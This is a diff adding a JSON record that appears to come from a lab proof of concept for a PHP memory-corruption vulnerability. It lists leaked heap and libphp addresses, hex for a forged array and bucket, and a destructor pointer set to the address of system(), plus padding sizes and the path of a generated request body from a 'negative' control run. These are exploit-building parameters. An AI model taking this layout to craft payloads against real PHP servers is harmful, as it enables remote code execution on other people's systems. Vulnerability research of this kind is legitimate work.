@@ -1,0 +1,39 @@
+{
+  "anchor_slot": "0x55b17533b3c0",
+  "array_file_offsets": [
+    "0x4f5850",
+    "0x4f5800",
+    "0x4f57b0"
+  ],
+  "body_size": 5767505,
+  "bucket_file_offsets": [
+    "0x4f6850",
+    "0x4f6800",
+    "0x4f67b0"
+  ],
+  "carrier_offset_decimal": 5195776,
+  "carrier_offset_hex": "0x4f4800",
+  "destructor_address": "0x7f0161d1a090",
+  "fake_array_address": "0x55b17533c3c0",
+  "fake_array_hex": "010000000700000000000000f8ffffffc0d33375b155000001000000010000000800000000000000000000000000000090a0d161017f0000",
+  "fake_bucket_address": "0x55b17533d3c0",
+  "fake_bucket_hex": "4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e",
+  "libphp_base": "0x7f015d200000",
+  "marker_path": null,
+  "marker_token": null,
+  "mode": "negative",
+  "output": "/root/php-cve-2026-10961x-lab-poc/runs/20261020T190429Z/bodies/negative.bin",
+  "output_sha256": "f0725816861855c0da8c77db854b787036a690ee44139fe0fa41aa4f824ec79a",
+  "pad_length": 5242880,
+  "pad_start_in_body": 192,
+  "slot_candidates": [
+    "0x55b17533b370",
+    "0x55b17533b3c0",
+    "0x55b17533b410"
+  ],
+  "slot_hex": "c0c33375b1550000070000000000000000000000000000000000000000000000",
+  "system_address": "0x7f0161d1a090",
+  "template": "/root/php-cve-2026-10961x-lab-poc/artifacts/template-position.bin",
+  "template_sha256": "0dd197eb55a7ddf7ae62e94c156dc228e8bef7c83ae7055af28457b304056d86",
+  "type_info": "0x7"
+}
